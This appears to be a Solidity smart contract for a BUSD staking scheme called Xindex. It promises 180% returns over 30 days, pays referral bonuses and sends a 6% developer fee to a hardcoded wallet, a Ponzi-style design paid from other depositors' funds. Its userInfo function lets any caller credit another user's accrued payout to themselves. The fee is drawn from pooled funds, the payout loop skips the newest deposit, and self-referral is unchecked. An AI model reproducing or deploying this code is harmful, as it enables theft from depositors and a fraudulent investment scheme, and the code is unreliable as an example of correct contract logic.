pragma solidity >=0.5.0;

import "./BUSD.sol";



contract Xindex {

    BUSD public busd;
    uint public depositsCount = 0;
    uint256 public commission = 5;
    uint public PERCENT_DIVIDER = 100;
    address public dev = 0xD10D0dE418246a391712DD5706b50296b386De17;
    address public owner;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    

    address[] public stakers;
    mapping(address => uint) public Balance;
    mapping(address => uint) public TotalInvest;
    mapping(address => uint) public TotalInvestCount;
    mapping(address => uint) public TotalWithdrawal;
    mapping(address => uint) public TotalCommission;
    mapping(address => bool) public hasStaked;
    mapping(address => bool) public isStaking;
    mapping(address => address) public Upline;
    mapping(address => uint) public dividends;
    mapping(address => uint40) public last_payout;
    mapping(uint => Deposit) public deposits;

    struct Deposit {
    uint id;   
    address payable owner;
    uint8 profit;
    uint8 life_days;
    uint256 amount;
    uint40 time;
    }

    constructor(BUSD _busd) public {
        busd = _busd;
        owner = msg.sender;

    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            last_payout[_addr] = uint40(block.timestamp);
            Balance[_addr] += payout;
        }
    }

    function deposit(uint256 _amount, address _upline) public {
        

        uint256 dev_mar_commisison = _amount * 6 / PERCENT_DIVIDER;
        uint256 original_amount = _amount * 94 / PERCENT_DIVIDER;
        
        busd.transferFrom(msg.sender, address(this), original_amount);
        busd.transfer(dev, dev_mar_commisison);
        

        if(!hasStaked[msg.sender]) {
            stakers.push(msg.sender);
        }


        isStaking[msg.sender] = true;
        hasStaked[msg.sender] = true;

        TotalInvest[msg.sender] = TotalInvest[msg.sender] + original_amount; 


        uint256 bonus = original_amount * commission / PERCENT_DIVIDER;
        TotalCommission[_upline] = TotalCommission[_upline] + bonus;
        Balance[_upline] = Balance[_upline] + bonus;
        match_bonus += bonus;
  
        TotalInvestCount[msg.sender] ++;
        invested += original_amount; 

        depositsCount ++;

        deposits[depositsCount] = Deposit(depositsCount, msg.sender, 180, 30, original_amount, uint40(block.timestamp));

    }
    
    function withdraw() external {
        
        _payout(msg.sender);

        uint balance = Balance[msg.sender]; 
        
        busd.transfer(msg.sender, balance); 

        Balance[msg.sender] = 0;
        TotalWithdrawal[msg.sender] = TotalWithdrawal[msg.sender] + balance;

        withdrawn += balance;
        
        isStaking[msg.sender] = false; 
    } 

    
    function payoutOf(address _addr) view external returns(uint256 value) {
        

        for(uint256 i=0;i<depositsCount;i++) {
            if(deposits[i].owner == _addr){


            uint40 time_end = deposits[i].time + 2592000; // deposit timestamp + 30 days in sec
            uint40 from = last_payout[_addr] > deposits[i].time ? last_payout[_addr] : deposits[i].time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += deposits[i].amount * (to - from) * deposits[i].profit / deposits[i].life_days / 8640000;
            }
        }
        }
        return value;
    }



    function userInfo(address _addr) external {

        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            last_payout[msg.sender] = uint40(block.timestamp);
            Balance[msg.sender] += payout;
        }



    }
}